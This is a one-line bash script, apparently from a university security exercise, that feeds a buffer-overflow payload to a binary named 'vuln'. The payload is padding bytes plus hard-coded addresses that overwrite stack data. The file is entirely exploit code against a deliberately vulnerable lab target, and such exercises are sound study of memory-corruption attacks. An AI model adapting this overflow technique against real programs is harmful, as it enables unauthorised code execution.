#!/usr/bin/env bash
echo -en "$(printf 'a%.0s' {1..440})\xe4\x88\xff\x43$(printf 'a%.0s' {1..440})\x30\xb3\xe5\xe0$(printf 'a%.0s' {1..7})" | /task1/s1808795/vuln
